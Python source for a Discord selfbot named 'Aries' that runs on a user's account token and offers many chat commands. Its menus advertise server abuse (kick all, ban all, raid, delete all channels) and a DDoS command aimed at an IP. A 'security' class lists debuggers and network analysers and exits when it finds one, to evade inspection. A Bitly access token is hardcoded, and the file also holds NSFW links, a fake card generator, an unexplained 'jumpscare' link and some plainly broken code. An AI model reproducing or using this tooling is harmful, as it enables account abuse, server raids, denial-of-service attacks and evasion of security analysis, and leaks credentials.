# ///////////////////////////////////////////////////////////////
# All Imports

import os
import re
import bs4
import sys
import json
import time
from discord.ext.commands.core import command
import httpx
import base64
import qrcode
import dhooks
import string
import socket
import urllib
import ctypes
import random
import discum
import psutil
import typing
import aiohttp
import asyncio
import discord
import pyimgur
import hashlib
import pwinput
import bitly_api
import requests
import threading
import pyPrivnote
import subprocess
import pypresence
import webbrowser
import platform
import ipapi
from art import *
from gtts import gTTS
from discord import *
from ctypes import windll
from pytube import YouTube
from os import listdir, name
from time import sleep
from ipwhois import IPWhois
from subprocess import call
from datetime import datetime
from licensing.models import *
from pypresence import Presence
from discord.ext import commands
from urllib.request import urlopen
from urllib.parse import quote_plus
import mysql.connector, hashlib
from time import localtime, strftime
import ctypes.wintypes as wintypes
from win10toast import ToastNotifier
from licensing.methods import Key, Helpers
from colorama import init, Fore, Back, Style
from os import error, name, system
from datetime import datetime as dt
from discord.ext.commands import MissingPermissions, CheckFailure, CommandNotFound, has_permissions

init() # Initialize colorama
#Startup
if (os.path.exists("./data/config.json")):
    pass
else:
    token  = input("Token: ")
    prefix = input("Prefix: ")
    sniper = input("Sniper? (y/n): ")
    fake_nitro_config = input("Fake Nitro? (y/n): ")
    selfbot_detection = input("Selfbot Detector? (y/n)")
    delete_timer = input("Delete Timer: ")
# ///////////////////////////////////////////////////////////////
# Aries Variables

beta = False
version = "1.0.6 Remastered"
command_amount = "103 "
authSkip = False
motd = "Its getting Chilly!"
start_time = dt.now()
ready = False
with open("./data/config.json") as f:
#Loads the json to read contents
        config = json.load(f)
prefix_config = config.get('prefix')
token_config = config.get('token')
nitro_sniper_config = config.get('sniper')
selfbot_detector_config = config.get('detector')
theme_config = config.get('theme')
afkmode_config = config.get('AFK')
afkmsg_config = config.get("AFK-Message")
deltimer_config = config.get("Delete_Timer")
afklogging = False
copier = False
NitroSound = False
fake_nitro = config.get("Fake-Nitro")
logo = """
                                                  ___         _          
                                                 /   |  _____(_)__  _____
                                                / /| | / ___/ / _ \/ ___/
                                               / ___ |/ /  / /  __(__  ) 
                                              /_/  |_/_/  /_/\___/____/  

"""

# ///////////////////////////////////////////////////////////////
# Aries Class & Functions

class aries:
    def console(clear=False, line=False):
        if clear:
            os.system("cls")
        print(Fore.RED + logo + Fore.RESET)
        if line:
            print(f'_' * os.get_terminal_size().columns)
    def progressbar(percent=0, width=30):
        # The number of hashes to show is based on the percent passed in. The
        # number of blanks is whatever space is left after.
        hashes = width * percent // 100
        blanks = width - hashes
        print('\r                                          [', hashes*'=', blanks*' ', ']', f' {percent:.0f}%', sep='', end='', flush=True)
    def getTerminalColor():
        with open(f"./data/themes/theme_config.json") as f:
            config = json.load(f)
            color = config.get('TColor')
            if color == "Red":
                return Fore.RED
            elif color == "Blue":
                return Fore.BLUE
            elif color == "Green":
                return Fore.GREEN
            elif color == "Cyan":
                return Fore.CYAN
            elif color == "Reset":
                return Fore.RESET
    def printTyping(text, delay):
        for x in text: 
            print(x, end="")
            sys.stdout.flush()
            time.sleep(delay)
    async def sendEmbed(ctx, description:string):
        await ctx.message.delete()
        with open("./data/config.json") as f:
            config = json.load(f)
        theme = config.get('theme')
        with open(f"./data/themes/{theme_config}.json") as f:
            #Loads the json to read contents
            config = json.load(f)
            color = config.get('color')
            sixteenIntegerHex = int(color.replace("#", ""), 16)
            readableHex = int(hex(sixteenIntegerHex), 0)
            embed = discord.Embed(title=config.get('title'), description = f"{description}", color=readableHex)
            embed.set_thumbnail(url = config.get('imageurl'))
            embed.set_footer(text = "made with ♡ by bomt & Nshout")
            await ctx.send(embed = embed, delete_after=int(deltimer_config))
    async def sendCustomEmbed(ctx, title:string, description:string):
        await ctx.message.delete()
        with open("./data/config.json") as f:
            config = json.load(f)
        theme = config.get('theme')
        with open(f"./data/themes/{theme_config}.json") as f:
            #Loads the json to read contents
            config = json.load(f)
            color = config.get('color')
            sixteenIntegerHex = int(color.replace("#", ""), 16)
            readableHex = int(hex(sixteenIntegerHex), 0)
            embed = discord.Embed(title=f"{title}", description = f"{description}", color=readableHex)
            embed.set_thumbnail(url = config.get('imageurl'))
            embed.set_footer(text = "made with ♡ by bomt & Nshout")
            await ctx.send(embed = embed, delete_after=int(deltimer_config))
    async def sendEmbedNoDelete(ctx, description:string):
        with open("./data/config.json") as f:
            config = json.load(f)
        theme = config.get('theme')
        with open(f"./data/themes/{theme_config}.json") as f:
            #Loads the json to read contents
            config = json.load(f)
            color = config.get('color')
            sixteenIntegerHex = int(color.replace("#", ""), 16)
            readableHex = int(hex(sixteenIntegerHex), 0)
            embed = discord.Embed(title=config.get('title'), description = f"{description}", color=readableHex)
            embed.set_thumbnail(url = config.get('imageurl'))
            embed.set_footer(text = "made with ♡ by bomt & Nshout")
            await ctx.send(embed = embed, delete_after=int(deltimer_config))
# ///////////////////////////////////////////////////////////////
# Security Class & Functions

class security:
    def getHWID():
            s = ""
            s += os.name
            s += str(platform.architecture())
            s += str(platform.version())
            s += str(os.cpu_count())
            s += str(os.getenv("PROCESSOR_IDENTIFIER"))
            s += str(os.getenv("PROCESSOR_ARCHITECTURE"))
            s += str(os.getenv("PROCESSOR_ARCHITEW6432"))
            s += str(os.getenv("NUMBER_OF_PROCESSORS"))
            return hashlib.sha256(s.encode()).hexdigest()
    def authenticate(license, hwid):
        print("Do auth here")
    def debuggerCheck(shutdown:bool):
        invalidProc = [ "taskmgr.exe", "httpdebuggersvc.exe", "httpdebuggerui.exe", "burpsuitecommunity.exe", "burpsuite.exe", "java bytecode editor.exe", "classeditor.exe", "fiddler everywhere.exe", "scylla_x64.exe", "megadumper.exe", "cheat engine.exe", "cheatengine.exe", "cheatengine.exe", "javassist.exe","processhacker.exe", "nemesis.exe", "ida.exe", "ida64.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "ksdumperdriver.sys.exe","ksdumper.exe", "dumper.exe", "codecracker.exe", "charles.exe", "dnspy.exe", "simpleassembly.exe", "peek.exe", "httpanalyzer.exe","httpdebug.exe", "fiddler.exe", "wireshark.exe", "dbx.exe", "mdbg.exe", "gdb.exe", "windbg.exe", "dbgclr.exe", "kdb.exe", "kgdb.exe", "mdb.exe","scylla_x86.exe", "scylla.exe", "idau64.exe", "http debugger.exe", "idaq.exe", "idaq64.exe", "idaw.exe", "idaw64.exe", "idag.exe", "recaf.exe","idag64.exe", "importrec.exe", "immunitydebugger.exe", "codebrowser.exe", "reshacker.exe", "hxd.exe", "reflector.exe", "process hacker.exe"]
        for proc in psutil.process_iter():
                processName = proc.name()
                processID = proc.pid
                if processName.lower() in invalidProc:
                    print("Error, Debugger Found!")
                    if (shutdown == True):
                        exit()
                    else:
                        pass
                    time.sleep(60000)
    def isVM(shutdown:bool):
        if hasattr(sys, 'real_prefix'):
             if (shutdown == True):
                exit()
             else:
                pass
# ///////////////////////////////////////////////////////////////
# Files Class & Functions

class files:
    def setup():
        """Creates the necessary folders"""
        ISDIR = os.path.isdir("./data")
        ISDIR2 = os.path.isdir("./data/themes")
        ISDIR3 = os.path.isdir("./assets")
        ISDIR4 = os.path.isdir("./data/notes")
        ISDIR5 = os.path.isdir("./data/beta")
        ISDIR6 = os.path.isdir("./data/emojis")
        if (not ISDIR):
            os.mkdir('./data')
        else:
            pass
        if (not ISDIR2):
            os.mkdir("./data/themes")
        else:
            pass
        if (not ISDIR3):
            os.mkdir("./assets")
        else:
            pass
        if (not ISDIR4):
            os.mkdir("./data/notes")
        if (not ISDIR5 and beta == True):
            os.mkdir("./data/beta")
        if (not ISDIR6):
            os.mkdir("./data/emojis")
        ISTHEME = os.path.isfile("/data/themes/Aries.json")
        themedata = {
        "title": "Aries",
        "imageurl":"https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif",
        "color": "#FF0000",
        "TColor": "Red"
          }   
        if not ISTHEME:
            with open("./data/themes/Aries.json", "w") as f:
                f.write(json.dumps(themedata, indent=4))
        else:
            pass
        data = {
            "token": f"{token}",
            "prefix": f"{prefix_config}",
            "sniper": f"{sniper}",
            "selfbot_detection": f"{selfbot_detection}",
            "theme": f"Aries",
            "AFK": f"False",
            "AFK-Message": f"I'm Currently Away!",
            "Fake-Nitro": f"{fake_nitro_config}",
            "Delete_Timer": f"{delete_timer}"
        }
        with open("./data/config.json", "w") as f:
            f.write(json.dumps(data, indent=4))

    def create_folder(path):
        """Creates a folder"""
        os.mkdir(path)

    def write_file(path, content, byte=False):
        """Writes a file"""
        if byte:
            with open(path, "wb") as f:
                f.write(content)
        else:
            with open(path, 'w') as f:
                f.write(content)
    def download_assets():
        """Downloads assets"""
        url = 'https://cdn.discordapp.com/attachments/811054611116982293/903074932425117696/resizedaries2.png'
        r = requests.get(url, allow_redirects=True)
        open('./assets/resizedaries2.png', 'wb').write(r.content)
        url = 'https://cdn.discordapp.com/attachments/811054611116982293/903074618905096212/ariesnobg.ico'
        r = requests.get(url, allow_redirects=True)
        open('./assets/ariesnobg.ico', 'wb').write(r.content)

# ///////////////////////////////////////////////////////////////
# Functions
def current_theme():
    with open("./data/config.json") as f:
        config = json.load(f)
    theme = config.get('theme')
    return theme
def bot_prefix(bot, message):
    """Get the prefix in the config file"""
    with open("./data/config.json") as f:
        config = json.load(f)
    prefix = config.get('prefix')
    return prefix

bot = commands.Bot(bot_prefix, self_bot=True, case_insensitive=True, guild_subscription_options=GuildSubscriptionOptions.off(), status=Status.dnd)
# ///////////////////////////////////////////////////////////////
# Events
bot.remove_command("help")
@bot.event
async def on_ready():
    """Prints a ready log."""
    aries.console(clear=True, line=True)
    print(f"{Fore.LIGHTRED_EX}Logged in as {bot.user}{Fore.RESET}")


# ///////////////////////////////////////////////////////////////
# Commands
@bot.command()
async def help(ctx):
    global version
    global command_amount
    await aries.sendCustomEmbed(ctx, "Aries Help Menu", f"\nHelp » Display this menu » [{prefix_config}help]\nAdmin » Display the admin page » [{prefix_config}admin]\nFun » Display the fun page » [{prefix_config}fun]\nMisc » Display the Misc page » [{prefix_config}misc]\nNSFW  » Display the NSFW page » [{prefix_config}nsfw]\nSettings » Show the Settings page » [{prefix_config}settings] \nNotes » Display the Aries Notes page » [{prefix_config}notes]\nSquidgames » Display the Squidgames page » [{prefix_config}squidgames]\nAbuse » Display the Abuse page » [{prefix_config}abuse]\nTheme » Display the Themes page » [{prefix_config}theme]\nUtilities » Display the Utilities page » [{prefix_config}utilities]\nSounds » Display the Sounds page » [{prefix_config}Sounds]\nBeta » Display the Beta Info page » [{prefix_config}Beta]\n\n**Aries Version » {version} » Commands » {command_amount} » Prefix » {prefix_config}** ")
@bot.command()
async def text(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Text Menu", f"ASCII Gen » Gen ASCII Text » [{prefix_config}ascii<text>]\nTypewrite » Write some text » [.typewrite <Delay, Message>]\nCodeblock » Write some text in a codeblock » [.codeblock <Mode, Message>]\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def beta(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Beta Menu", f"\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def sounds(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Sounds Menu", f"NitroSound » Toggle NitroSound » [{prefix_config}NitroSound<True/False>]\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def abuse(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Abuse Menu", f"Kickall » Kick all members of a server » [{prefix_config}kickall]\nDelchannels » Delete all server channels » [{prefix_config}delchannels]\nRaid » Raid a server » [{prefix_config}raid]\nCreatechannels » Create 70 channels » [{prefix_config}createchannels]\nBanAll » Ban all users » [{prefix_config}banall <None>]\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def admin(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Administrator Menu", f"Ban » Ban A Member » [{prefix_config}ban <Person>]\nKick » Kick A Member » [{prefix_config}kick <Person>]\nUnban » Unban a user » [{prefix_config}unban <User>]\nPurge » Purge <> of msgs » [{prefix_config}purge <Amount>] » [Amount]\nCreate » Create a channel » [{prefix_config}Create <Args>]\nDelete » Delete a channel » [{prefix_config}delete <None>]\nListbans » Show all bans » [{prefix_config}listbans <None>]\nNuke » Nukes the channel sent in » [{prefix_config}nuke <None>]\nBanrecord » Saves serv bans to a file » [{prefix_config}banrecord <None>]\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def notes(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Notes Menu", f"CN » Create a note » [{prefix_config}cn <Name, Content>]\nEN » Edit a note » [{prefix_config}en <Newname, Newcontent>]\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def Squidgames(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Squidgames Menu", f"evenorodd » guess even or odd! » [{prefix_config}evenorodd <None>]\nsteppingstones » Are you safe? » [{prefix_config}steppingstones <None>]\n\n**<> = Arguments [] = Usage**")
#Fun Commands
@bot.command()
async def fun(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Fun Menu", f"RollDice » Roll a Number! » [{prefix_config}roll <None>]\nAllah » Talk to ALLAH » [{prefix_config}allah <None>]\nPickup Line » Tell a pickup » [{prefix_config}pickup <None>]\nJoke » Tell a joke » [{prefix_config}joke <None>] \nRickRoll » Rick ur friends ;) » [{prefix_config}rickroll <None>]\nLeave » Leave the current server » [{prefix_config}leave <None>]\nFakeNitro » Sends a Fake Nitro Message » [{prefix_config}fakenitro <None>]\nSpam » Spam a message » [{prefix_config}spam <Delay, amount message>]\nMeme » Send a random meme » [.meme <None>] \nUpload » Upload an img to imgur » [.uploadimg <Image Here>]\nCopycat » Copy a user! » [.copycat <User, True/False>]\nHowgay » How gay is a user? » [.howgay <User>]\nDicksize » How big is a users dick? » [.dicksize <User>]\nInsult » Insult someone! » [.insult <Person>]\nIQ » Get Someones IQ » [.IQ <Person>]\nGhostping » Ghostping someone! » [.ghostping <Person>]\nRocket » Rocket animation in console! » [.rocket <None>]\nFaketoken » Generate a fake discord token » [.faketoken <None>]\nJumpscare » Send a jumpscare » [.jumpscare <None>]\n\n**<> = Arguments [] = Usage**")
#Misc Commands
@bot.command()
async def misc(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Misc Menu", f"Restart » Restarts Aries » [{prefix_config}restart <None>]\nUserinfo » Shows your userinfo » [{prefix_config}userinfo <None>]\nTodo » Shows the bots TODO list » [{prefix_config}todo <None>]\nAvatar » Display Avatar of a user » [{prefix_config}Avatar <User>]\nInvite » Get an invite to Aries » [{prefix_config}ariesinvite <None>]\nEmbed » Sends an Embed message » [{prefix_config}embed <Title, Desc>]\nNick » Change your nickname » [{prefix_config}nick <Newnick>]\nDate » Check the date » [{prefix_config}date <None>]\nTime » Check the time! » [{prefix_config}time <None>] \nServer » Get Server Info! » [{prefix_config}server <None>]\nInvite » Get the server invite! » [{prefix_config}invite] \nSend Noti » Send a windows noti » [{prefix_config}sendnoti <Title, Message>]\nGen Password » Gen a pass » [{prefix_config}genpass <Length>]\nUptime » Check the time sinch Launch » [{prefix_config}uptime <None>] \nEncode b64 » Encode msg using b64 » [{prefix_config}ecb64 <Message>]\nDecode b64 » Decode a b64 msg » [{prefix_config}dcb64 <Message>]\nServerEmojis » Send a list of server emojis » [{prefix_config}serveremojis <None>]\nSpamReact » Spam react to a msg » [{prefix_config}spamreact <MSG ID>]\nCheckBan » Check a hypixel ban » [{prefix_config}checkban <uuid, banid>]\nFolder » Open the Aries folder » [{prefix_config}folder <None>]\nFakeCard » fake credit card » [{prefix_config}fakecreditcard <None>]\n\n**<> = Arguments [] = Usage**")
#NSFW Commands
@bot.command()
async def nsfw(ctx):
    await aries.sendCustomEmbed(ctx, "Aries NSFW Menu", f"Boobs » Shows boobs » [{prefix_config}boobs <None>]\nHentai » shows hentai » [{prefix_config}hentai <None>]\nPussy » Show pussy » [{prefix_config}pussy <None>]\nHentaiGif » shows hentai gif » [{prefix_config}hentaigif <None>]\n\n**<> = Arguments [] = Usage**")
#Theme Commands
@bot.command()
async def theme(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Themes Menu", f"settheme » Set your theme »[{prefix_config}settheme <ThemeName>]\nuploadtheme » Upload a theme » [{prefix_config}uploadtheme <ThemeName>]\ncreatetheme » Create a New Theme » [{prefix_config}createtheme <name, title, imageurl, color>]\nedittheme » Edit a theme » [{prefix_config}edittheme <name, newtitle, newimage, newcolor>]\ninstalltheme » Install a Theme » [{prefix_config}installtheme <Name>]\n\n**<> = Arguments [] = Usage**")
#Attack Commands
@bot.command()
async def utilities(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Utilities Menu", f"ddos » DDoS Someone » [{prefix_config}ddos <threads, ip>]\npingip » Ping an IP » [{prefix_config}pingip <IP>]\nafk » Set your AFK Status » [{prefix_config}afk <True/False>]\nIplookup » Get an IP's Info » [{prefix_config}iplookup <ip>]\nCPU » Get Your CPU Usage and Info » [{prefix_config}cpu <None>]\nPoll » Make a poll! » [{prefix_config}poll <Question>]\nSupport » Receive Aries Support » [{prefix_config}support <None>]\nBackup » Backup the server you send this in » [{prefix_config}backup <None>]\nPingweb » Ping a website » [{prefix_config}pingweb <Website>]\nGoogleSearch » Search on google » [{prefix_config}googlesearch <Search>]\nConvertVideo » DL a YT vid to mp4 » [{prefix_config}convertvideo <link>]\nHeaders » Get the headers of a website » [{prefix_config}headers <link>]\nShortenURL » Shorten a link » [{prefix_config}shortenurl <link>]\nCalculator » Opens calculator » [{prefix_config}calculator <None>]\nOpenapp » Opens an app of choice (buggy) » [{prefix_config}openapp <Name>]\nWebsiteIP » Get an IP of a website » [{prefix_config}grabsiteip <Site>]\nCrypto » Display Crypto Currency Stats » [{prefix_config}Crypto <None>]\n\n**<> = Arguments [] = Usage**")
#Settings Commands
@bot.command()
async def settings(ctx):
     await aries.sendCustomEmbed(ctx, "Settings Menu", f"Status » Change your Status » [{prefix_config}status <Status>]\nSniper » Check sniper status » Check the Nitro Sniper Status » [{prefix_config}sniperstatus <None>]\nCheckPrefix » Check Aries Prefix » [{prefix_config}prefix <None>]\nSBDetector » Check Aries Detection » [{prefix_config}selfbotdetector <None>] » [None]\nSetSniper » Check Aries Nitro Sniper » [{prefix_config}setsniper <True/False>\nAFKMessage » Set Aries AFK Message » [{prefix_config}afkmessage <msg>\nSetDet » Set Aries SB Detector » [{prefix_config}setdet <val>\n\n**<> = Arguments [] = Usage**")
#Embed Command
@bot.command()
async def embed(ctx, titleEdit, descriptionEdit):
    await aries.sendCustomEmbed(ctx, titleEdit, descriptionEdit)
@bot.command()
async def folder(ctx):
    path = f"{str(os.getcwd())}"
    webbrowser.open(path)
@bot.command()
async def googlesearch(ctx, *, question):
    #Search
    searchInput = "https://google.com/search?q="+ urllib.parse.quote(question)
    #Get
    res = requests.get(searchInput)

    res.raise_for_status()

    soup = bs4.BeautifulSoup(res.text, "html.parser")
    #Get the Link elements
    linkElements = soup.select('div#main > div > div > div > a')
    #Check length of linkElements if 0 no results
    if len(linkElements) == 0:
        await aries.sendEmbed(ctx, "No Results Found!") 
        #Else if found results
    else:
        #Link variable
        link = linkElements[0].get("href")
        #Set variable i to 0
        i = 0

        while link[0:4] != "/url" or link[14:20] == "google":

            i += 1

        link = linkElements[i].get("href")
        #Send Results
        await aries.sendEmbed(ctx, "http://google.com" + link)
          #  embed = discord.Embed(title=config.get('title'), description = "http://google.com" + link, color=readableHex)    
@bot.command()
async def jumpscare(ctx):
    await ctx.message.delete()
    await ctx.send("wtf is this monkey doing? https://pnrtscr.com/kqrkc7")
@bot.command()
async def backup(ctx):
    await ctx.message.delete()
    await bot.create_guild(f'backup-{ctx.guild.name}')
    try:
        for guild in bot.guilds:
            if f'backup-{ctx.guild.name}' in guild.name:
                for channels in guild.channels:
                    await channels.delete()
                for category in ctx.guild.categories:
                    x = await guild.create_category(f"{category.name}")
                    for channel in category.channels:
                        if isinstance(channel, discord.VoiceChannel):
                            await x.create_voice_channel(f"{channel}")
                        if isinstance(channel, discord.TextChannel):
                            await x.create_text_channel(f"{channel}")
                for role in ctx.guild.roles:
                    await guild.create_role(name=role.name, permissions=role.permissions, colour=role.colour)
    except Exception:
        pass
@bot.command()
async def wyrather(ctx):
    wyr = ["Would you rather Eat pizza, or Icecream for your WHOLE life?"]
    await aries.sendEmbed(ctx, random.choice(wyr))
@bot.command()
async def ban(ctx, member : discord.Member, *, reason = None):
    try:
        await aries.sendEmbed(ctx, "Banned " + member.mention + " Successfully! ")       
        await member.ban(reason = reason)
    except:  
        await aries.sendEmbed(ctx, "Error | Insufficient Perms!")    
@bot.command()
async def kick(ctx, member : discord.Member, *, reason = None):
    try:   
        await aries.sendEmbed(ctx, "Kicked " + member.mention + " Successfully! ")
        await member.kick(reason = reason)
        await ctx.send(embed = embed) 
    except commands.MissingPermissions:
        await aries.sendEmbed(ctx, "Error | Insufficient Perms!")    
@bot.command()
async def purge(ctx, limit: int):
    #Accounting for the fact it doesn't delete the prefix purge part.
    limit = limit + 1
    try:
        await ctx.channel.purge(limit=limit)  
        await aries.sendEmbedNoDelete(ctx, "Successful Purge!")
    except commands.MissingPermissions:
        await aries.sendEmbed(ctx, "Error | Insufficient Perms!")  
@bot.command()
async def create(ctx, name):
    try:
        guild = ctx.guild
        #channel = await guild.create_text_channel(channel_name)
        await guild.create_text_channel(name)
        await aries.sendEmbed(ctx, "Created " + "Successfully")
    except commands.MissingPermissions:
        await aries.sendEmbed(ctx, "Error | Insufficient Perms!")
@bot.command()
async def shortenurl(ctx, link):
    #Bitly Access
    BITLY_ACCESS_TOKEN ="84ad42991d089c4629293f0cf5f2fa1a65c3b1f0" 
    #Connect with the token
    access = bitly_api.Connection(access_token = BITLY_ACCESS_TOKEN)
    #Shorten url
    short_url = access.shorten(link)  
    #Send shorter URL
    await aries.sendEmbed(ctx, f"Shorter Link: {short_url['url']}")
@bot.command()
async def delete(ctx, name):
    try:
        guild = ctx.guild
        existing_channel = discord.utils.get(guild.channels, name=name)
        await existing_channel.delete()
        await aries.sendEmbed(ctx, f"Deleted {name} Successfully!")    
    except commands.MissingPermissions:
        await aries.sendEmbed(ctx, "Error | Insufficient Perms!")   
@bot.command()
async def roll(ctx):
    await aries.sendEmbed(ctx, str(random.randrange(1, 2000)))
@bot.command()
async def restart(ctx):
    aries.sendEmbed(ctx, "Restarting in 5 seconds...")
    #Give user time to know we are restarting // Sleep 5 Seconds
    await asyncio.sleep(5)
    #Exit and Run the bot Agian
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def faketoken(ctx):
   y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(17))
   x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(3))
   w = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(27))
   aries.sendEmbed(ctx, f"ODg4ODI{y}.YUY{x}.{w}\n")
   # embed = discord.Embed(title="", description = f"ODg4ODI{y}.YUY{x}.{w}\n", color=readableHex)
#Boobs Command
@bot.command()
async def boobs(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="", description = "", color=readableHex)
    boobs = ["https://external-preview.redd.it/_8von5M373BhKDn4sUUtZO0ejyegPnjYcaboJ4LHG18.jpg?width=640&crop=smart&auto=webp&s=08da86e1978676e513b91a2dbc3d88725fb75db1", "https://preview.redd.it/oqwo0gq23vn61.jpg?width=960&crop=smart&auto=webp&s=fd154960c155a57f9659ea1755dd3073d44560b5", "https://external-preview.redd.it/hfW3TZ2jmZVmlQHBs9ag4IPvCbb2KWu5Mb2VCN9JHiw.jpg?width=640&crop=smart&auto=webp&s=457c2174307f125e4af4d219475362e819b415a4", "https://external-preview.redd.it/8pBuABS3Walu8_nePp_0E71lcxQqloq_xCwS7fQ6niA.jpg?width=640&height=491&crop=smart&auto=webp&s=6a3e174509e3349d4c0e7a945e1b77d55d8db946", "https://bootyalbum.com/wp-content/uploads/2021/02/Would-Reddit-appreciate-my-18-yo-DD-boobs-892x1189.jpg", "https://i.redd.it/j6krhwtjlt371.jpg", "https://i.redd.it/jkzx3cedofu61.jpg"]
    embed.set_footer(text = "made with ♡ by bomt")
    embed.set_image(url=random.choice(boobs))
    await ctx.send(embed=embed)
#Status Command
@bot.command()
async def status(ctx, *args):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    #AFK
    embed = discord.Embed(title=config.get('title'), description = "Changed Status to AFK", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    #Online
    embed1 = discord.Embed(title=config.get('title'), description = "Changed Status to Online", color=readableHex)
    embed1.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    #DND
    embed2 = discord.Embed(title=config.get('title'), description = "Changed Status to DND", color=readableHex)
    embed2.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    stati = {
        "on":       Status.online,
        "online":   Status.online,
        "off":      Status.invisible,
        "offline":  Status.invisible,
        "dnd":      Status.dnd,
        "idle":     Status.idle,
        "afk":      Status.idle
    }
    if args:
        if (args[0] in stati):
            #Checks if Args are equal to AFK ex .status the args would be after status
            if (args[0] == "afk"):
                await bot.change_presence(status=Status.idle, afk=True)
                await ctx.send(embed=embed)
    if (args[0] == "dnd"):
        await bot.change_presence(status=Status.dnd, afk=False)
        await ctx.send(embed=embed2)
    if (args[0] == "online"):
        await bot.change_presence(status=stati[args[0]], afk=False)
        await ctx.send(embed=embed1)
@bot.command()
async def openapp(ctx, app):
    call([f"{app}.exe"])
    print(app)
@bot.command()
async def calculator(ctx):
    call(["calc.exe"])
    aries.sendEmbed(ctx, f"Opened!")
#UserInfo Command
@bot.command()
async def userinfo(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    global start_time
    end_time = dt.now()
    embed = discord.Embed(title= config.get('title'), description = 'Time Since Start: {}'.format(end_time - start_time), color=readableHex)
    userinfo1 = bot.get_user(bot.user.id)
    num = 0
    for i in range (0, len(bot.user.friends)):
        num += 1
    embed = discord.Embed(title=config.get('title'), description = "Name » " + str(bot.user) + "\nUsers In » " + str(len(bot.guilds)) + f" Guilds\n" + 'You have been using Aries For » {}'.format(end_time - start_time) + f"\nYour Account Was Created At »\n {userinfo1.created_at}" + f"\nYou Have: {int(num)} Friends" + "\nAvatar ↓ ", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    embed.set_image(url = str(bot.user.avatar_url))
    await ctx.send(embed = embed)
#todo command
@bot.command()
async def todo(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = "New UI\nSecurity\nFinish 30 Commands", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
#Sniper Command
@bot.command()
async def sniperstatus(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = str(f"{nitro_sniper_config}"), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
#Avatar Command
@bot.command()
async def avatar(ctx, *, user: discord.Member = None):
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    await ctx.message.delete()
    embed = discord.Embed(title= str(user) + "'s Avatar", description = "", color=readableHex)
    embed.set_image(url = str(user.avatar_url))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
#Sniper Command
@bot.command()
async def allah(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "I AM ALLAH" + "'s Avatar", description = "ALLAH HAS SPOKEN GET ARIES", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def pickup(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    pickuplines = ["if you were a booger, i'd pick you first", "sup, are you from tennessee? cause your the only 10 i see ", "basic math: add the bed, subtract the clothes, divide the legs, and pray we don't multiply ", "you're so hot, my zipper is falling for you", "Are you an elevator? Because I’ll go up and down on you."]
